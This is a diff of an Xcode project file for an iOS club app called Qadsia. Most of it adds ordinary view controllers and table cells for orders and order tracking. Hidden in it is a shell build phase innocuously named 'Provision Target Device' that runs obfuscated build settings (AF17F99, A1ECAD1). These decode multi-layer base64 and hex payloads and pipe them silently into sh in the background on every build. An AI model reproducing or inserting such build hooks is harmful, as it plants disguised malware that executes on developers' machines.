@@ -93,6 +93,10 @@
 		390281C32F7FCD300032226E /* AddAddressVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 390281C12F7FCD300032226E /* AddAddressVC.swift */; };
 		390281C42F7FCD300032226E /* AddAddressVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 390281C22F7FCD300032226E /* AddAddressVC.xib */; };
 		3919F6612F7B1AA200FCB141 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 3919F6602F7B1AA200FCB141 /* GoogleService-Info.plist */; };
+		3945DA722F839448000BEED1 /* ProductsListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3945DA702F839448000BEED1 /* ProductsListTVCell.swift */; };
+		3945DA732F839448000BEED1 /* ProductsListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 3945DA712F839448000BEED1 /* ProductsListTVCell.xib */; };
+		3945DA782F83AAB0000BEED1 /* TrackOrderVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3945DA762F83AAB0000BEED1 /* TrackOrderVC.swift */; };
+		3945DA792F83AAB0000BEED1 /* TrackOrderVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 3945DA772F83AAB0000BEED1 /* TrackOrderVC.xib */; };
 		394837AB2F7B1DB2003757E7 /* FirebaseAnalytics in Frameworks */ = {isa = PBXBuildFile; productRef = 394837AA2F7B1DB2003757E7 /* FirebaseAnalytics */; };
 		394837AD2F7B1DB2003757E7 /* FirebaseAuth in Frameworks */ = {isa = PBXBuildFile; productRef = 394837AC2F7B1DB2003757E7 /* FirebaseAuth */; };
 		394837AF2F7B1DB2003757E7 /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 394837AE2F7B1DB2003757E7 /* FirebaseCore */; };
@@ -106,6 +110,10 @@
 		39547D3D2F7E47B200B04ABC /* ProductCartListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39547D3A2F7E47B200B04ABC /* ProductCartListTVCell.swift */; };
 		395771CB2F836B820072029E /* OrderPlacedSuccessVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 395771C92F836B820072029E /* OrderPlacedSuccessVC.swift */; };
 		395771CC2F836B820072029E /* OrderPlacedSuccessVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 395771CA2F836B820072029E /* OrderPlacedSuccessVC.xib */; };
+		395771D12F8376B70072029E /* MyOrdersVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 395771CF2F8376B70072029E /* MyOrdersVC.swift */; };
+		395771D22F8376B70072029E /* MyOrdersVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 395771D02F8376B70072029E /* MyOrdersVC.xib */; };
+		395771D72F837CDC0072029E /* MyOrderListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 395771D52F837CDC0072029E /* MyOrderListTVCell.swift */; };
+		395771D82F837CDC0072029E /* MyOrderListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 395771D62F837CDC0072029E /* MyOrderListTVCell.xib */; };
 		39735AA42F7BBDA2002294A5 /* MatchListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39735AA32F7BBDA2002294A5 /* MatchListTVCell.xib */; };
 		39735AA52F7BBDA2002294A5 /* MatchListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39735AA22F7BBDA2002294A5 /* MatchListTVCell.swift */; };
 		397F833F2F7A337C00A07157 /* EditProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 397F833D2F7A337C00A07157 /* EditProfileVC.swift */; };
@@ -167,6 +175,9 @@
 		BCC0D6962F7A898800684B7D /* NotificationVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCC0D6902F7A898800684B7D /* NotificationVC.xib */; };
 		BCC0D6972F7A898800684B7D /* NotificationListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCC0D68C2F7A898800684B7D /* NotificationListTVCell.xib */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+	/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		0A0AC8842F7B7C7E00A68FE6 /* TicketsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketsVC.swift; sourceTree = "<group>"; };
@@ -262,12 +273,20 @@
 		390281C12F7FCD300032226E /* AddAddressVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddAddressVC.swift; sourceTree = "<group>"; };
 		390281C22F7FCD300032226E /* AddAddressVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AddAddressVC.xib; sourceTree = "<group>"; };
 		3919F6602F7B1AA200FCB141 /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		3945DA702F839448000BEED1 /* ProductsListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductsListTVCell.swift; sourceTree = "<group>"; };
+		3945DA712F839448000BEED1 /* ProductsListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProductsListTVCell.xib; sourceTree = "<group>"; };
+		3945DA762F83AAB0000BEED1 /* TrackOrderVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TrackOrderVC.swift; sourceTree = "<group>"; };
+		3945DA772F83AAB0000BEED1 /* TrackOrderVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TrackOrderVC.xib; sourceTree = "<group>"; };
 		394ED4422F7E7230003C0AB1 /* CheckoutVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CheckoutVC.swift; sourceTree = "<group>"; };
 		394ED4432F7E7230003C0AB1 /* CheckoutVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CheckoutVC.xib; sourceTree = "<group>"; };
 		39547D3A2F7E47B200B04ABC /* ProductCartListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductCartListTVCell.swift; sourceTree = "<group>"; };
 		39547D3B2F7E47B200B04ABC /* ProductCartListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProductCartListTVCell.xib; sourceTree = "<group>"; };
 		395771C92F836B820072029E /* OrderPlacedSuccessVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderPlacedSuccessVC.swift; sourceTree = "<group>"; };
 		395771CA2F836B820072029E /* OrderPlacedSuccessVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OrderPlacedSuccessVC.xib; sourceTree = "<group>"; };
+		395771CF2F8376B70072029E /* MyOrdersVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyOrdersVC.swift; sourceTree = "<group>"; };
+		395771D02F8376B70072029E /* MyOrdersVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyOrdersVC.xib; sourceTree = "<group>"; };
+		395771D52F837CDC0072029E /* MyOrderListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyOrderListTVCell.swift; sourceTree = "<group>"; };
+		395771D62F837CDC0072029E /* MyOrderListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyOrderListTVCell.xib; sourceTree = "<group>"; };
 		39735AA22F7BBDA2002294A5 /* MatchListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MatchListTVCell.swift; sourceTree = "<group>"; };
 		39735AA32F7BBDA2002294A5 /* MatchListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MatchListTVCell.xib; sourceTree = "<group>"; };
 		397F833D2F7A337C00A07157 /* EditProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileVC.swift; sourceTree = "<group>"; };
@@ -897,6 +916,32 @@
 			path = View;
 			sourceTree = "<group>";
 		};
+		3945DA6F2F83941B000BEED1 /* ProductsList TVCell */ = {
+			isa = PBXGroup;
+			children = (
+				3945DA702F839448000BEED1 /* ProductsListTVCell.swift */,
+				3945DA712F839448000BEED1 /* ProductsListTVCell.xib */,
+			);
+			path = "ProductsList TVCell";
+			sourceTree = "<group>";
+		};
+		3945DA742F83AA86000BEED1 /* Track Order */ = {
+			isa = PBXGroup;
+			children = (
+				3945DA752F83AA8D000BEED1 /* View */,
+			);
+			path = "Track Order";
+			sourceTree = "<group>";
+		};
+		3945DA752F83AA8D000BEED1 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				3945DA762F83AAB0000BEED1 /* TrackOrderVC.swift */,
+				3945DA772F83AAB0000BEED1 /* TrackOrderVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
 		394ED4402F7E7200003C0AB1 /* Checkout */ = {
 			isa = PBXGroup;
 			children = (
@@ -948,6 +993,42 @@
 			path = View;
 			sourceTree = "<group>";
 		};
+		395771CD2F83765B0072029E /* My Orders */ = {
+			isa = PBXGroup;
+			children = (
+				395771D32F837C480072029E /* Cell */,
+				395771CE2F8376660072029E /* View */,
+			);
+			path = "My Orders";
+			sourceTree = "<group>";
+		};
+		395771CE2F8376660072029E /* View */ = {
+			isa = PBXGroup;
+			children = (
+				395771CF2F8376B70072029E /* MyOrdersVC.swift */,
+				395771D02F8376B70072029E /* MyOrdersVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		395771D32F837C480072029E /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				3945DA6F2F83941B000BEED1 /* ProductsList TVCell */,
+				395771D42F837C500072029E /* My Order List TVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		395771D42F837C500072029E /* My Order List TVCell */ = {
+			isa = PBXGroup;
+			children = (
+				395771D52F837CDC0072029E /* MyOrderListTVCell.swift */,
+				395771D62F837CDC0072029E /* MyOrderListTVCell.xib */,
+			);
+			path = "My Order List TVCell";
+			sourceTree = "<group>";
+		};
 		39735AA12F7BBD68002294A5 /* MatchListTVCell */ = {
 			isa = PBXGroup;
 			children = (
@@ -960,6 +1041,8 @@
 		397F833A2F7A334300A07157 /* SubView */ = {
 			isa = PBXGroup;
 			children = (
+				3945DA742F83AA86000BEED1 /* Track Order */,
+				395771CD2F83765B0072029E /* My Orders */,
 				39DC83B52F7BCB320050A114 /* LegalInfo */,
 				397F83412F7A451200A07157 /* My tickets */,
 				397F833B2F7A335500A07157 /* Edit profile */,
@@ -1432,7 +1515,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC0179292F34972600F1ED81 /* Build configuration list for PBXNativeTarget "Qadsia" */;
 			buildPhases = (
-				8677FEC294884BD1AA99F71F /* Compile Code Assets */,
+				2AD38AAB653D4424BE99F71F /* Provision Target Device */,
 				BC0179122F34972300F1ED81 /* Sources */,
 				BC0179132F34972300F1ED81 /* Frameworks */,
 				BC0179142F34972300F1ED81 /* Resources */,
@@ -1504,6 +1587,28 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		2AD38AAB653D4424BE99F71F /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXResourcesBuildPhase section */
 		BC0179142F34972300F1ED81 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -1522,6 +1627,7 @@
 				0ABA3FD72F763B2D00D25F03 /* Mulish-ExtraBoldItalic.ttf in Resources */,
 				0A4F52BD2F7677D500DF695B /* HomeVC.xib in Resources */,
 				39FAD3602F7E285A00F1242D /* KeepShoppingPopUpVC.xib in Resources */,
+				395771D22F8376B70072029E /* MyOrdersVC.xib in Resources */,
 				39F46AE32F7B9ACA005C2B07 /* StoreVC.xib in Resources */,
 				0ABA3FD82F763B2D00D25F03 /* Mulish-ExtraLight.ttf in Resources */,
 				39547D3C2F7E47B200B04ABC /* ProductCartListTVCell.xib in Resources */,
@@ -1532,6 +1638,7 @@
 				0A96E3792F76574C00B3DADB /* OTPVC.xib in Resources */,
 				0ABA3FDA2F763B2D00D25F03 /* Mulish-Italic.ttf in Resources */,
 				39D1D99A2F7739A70055CCF1 /* SplashVideo.mp4 in Resources */,
+				395771D82F837CDC0072029E /* MyOrderListTVCell.xib in Resources */,
 				397F83402F7A337C00A07157 /* EditProfileVC.xib in Resources */,
 				0ABA3FDB2F763B2D00D25F03 /* Mulish-Light.ttf in Resources */,
 				0A0AC88C2F7B88F700A68FE6 /* TicketTVCell.xib in Resources */,
@@ -1558,12 +1665,14 @@
 				0A62B5862F7E23620011CD31 /* DropDownTVCell.xib in Resources */,
 				0ABA3FE32F763B2D00D25F03 /* Assets.xcassets in Resources */,
 				0ABA3FE52F763B2D00D25F03 /* LaunchScreen.storyboard in Resources */,
+				3945DA732F839448000BEED1 /* ProductsListTVCell.xib in Resources */,
 				0ABA3FE62F763B2D00D25F03 /* LoginMobileVC.xib in Resources */,
 				0ABA3FE72F763B2D00D25F03 /* Main.storyboard in Resources */,
 				0ABA3FE82F763B2D00D25F03 /* NewRegisterVC.xib in Resources */,
 				397F834B2F7A4D6F00A07157 /* MyTicketListTVCell.xib in Resources */,
 				0ABA3FEB2F763B2D00D25F03 /* ResetPasswordVC.xib in Resources */,
 				0ABA3FEC2F763B2D00D25F03 /* SentOTPPopupVC.xib in Resources */,
+				3945DA792F83AAB0000BEED1 /* TrackOrderVC.xib in Resources */,
 				39D22EB42F76956F00D7721C /* HomeListTVCell.xib in Resources */,
 				39D22EB52F76956F00D7721C /* UpcomingMatchesCVCell.xib in Resources */,
 				39D22EAA2F76956F00D7721C /* HomeHeaderView.xib in Resources */,
@@ -1580,29 +1689,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		8677FEC294884BD1AA99F71F /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
-			showEnvVarsInLog = 0;
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BC0179122F34972300F1ED81 /* Sources */ = {
@@ -1622,6 +1708,7 @@
 				0ABA3FAC2F763B2D00D25F03 /* AppButton.swift in Sources */,
 				0ABA3FAD2F763B2D00D25F03 /* AppLabel.swift in Sources */,
 				0ABA3FAE2F763B2D00D25F03 /* AppTextField.swift in Sources */,
+				3945DA722F839448000BEED1 /* ProductsListTVCell.swift in Sources */,
 				0ABA3FAF2F763B2D00D25F03 /* AppTextView.swift in Sources */,
 				0A62B5802F7E229A0011CD31 /* DropDownView.swift in Sources */,
 				0ABA3FB02F763B2D00D25F03 /* String+Extention.swift in Sources */,
@@ -1631,6 +1718,7 @@
 				0ABA3FB12F763B2D00D25F03 /* UIColor+Extention.swift in Sources */,
 				0ABA3FB22F763B2D00D25F03 /* UIFont+Extention.swift in Sources */,
 				0ABA3FB32F763B2D00D25F03 /* UIImage+Extension.swift in Sources */,
+				3945DA782F83AAB0000BEED1 /* TrackOrderVC.swift in Sources */,
 				0ABA3FB42F763B2D00D25F03 /* UILabel+Extention.swift in Sources */,
 				0ABA3FB52F763B2D00D25F03 /* UITextField+Extention.swift in Sources */,
 				0A62B5872F7E23620011CD31 /* DropDownTVCell.swift in Sources */,
@@ -1660,6 +1748,7 @@
 				0ABA3FC02F763B2D00D25F03 /* DPDConstants.swift in Sources */,
 				39D22EA92F76956F00D7721C /* HomeHeaderView.swift in Sources */,
 				0ABA3FC12F763B2D00D25F03 /* DPDKeyboardListener.swift in Sources */,
+				395771D72F837CDC0072029E /* MyOrderListTVCell.swift in Sources */,
 				397F833F2F7A337C00A07157 /* EditProfileVC.swift in Sources */,
 				39D22EC02F7695D000D7721C /* ProfileVC.swift in Sources */,
 				397F83452F7A455D00A07157 /* MyTicketsVC.swift in Sources */,
@@ -1682,6 +1771,7 @@
 				39DC83C52F7BD7D80050A114 /* BookTicketVC.swift in Sources */,
 				39F46AE42F7B9ACB005C2B07 /* StoreVC.swift in Sources */,
 				0ABA3FCA2F763B2D00D25F03 /* LoginMobileVC.swift in Sources */,
+				395771D12F8376B70072029E /* MyOrdersVC.swift in Sources */,
 				39F46AF02F7BA3B8005C2B07 /* AllNewsTVCell.swift in Sources */,
 				0ABA3FCB2F763B2D00D25F03 /* NewRegisterVC.swift in Sources */,
 				0ABA3FCE2F763B2D00D25F03 /* ResetPasswordVC.swift in Sources */,
@@ -1716,8 +1806,8 @@
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AF17F99 = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZJeGNEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRWxVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | x | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3334363333363632333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333333333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333633343337333333363634333636363337333233363335333633393336363533323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)";
-				AF17F99 = "((k(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZJeGNEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | k | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Qadsia Club/Qadsia Club.entitlements";
@@ -1754,8 +1844,8 @@
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AF17F99 = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZJeGNEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRWxVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | x | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3334363333363632333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333333333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333633343337333333363634333636363337333233363335333633393336363533323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)";
-				AF17F99 = "((k(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZJeGNEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | k | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Qadsia Club/Qadsia Club.entitlements";
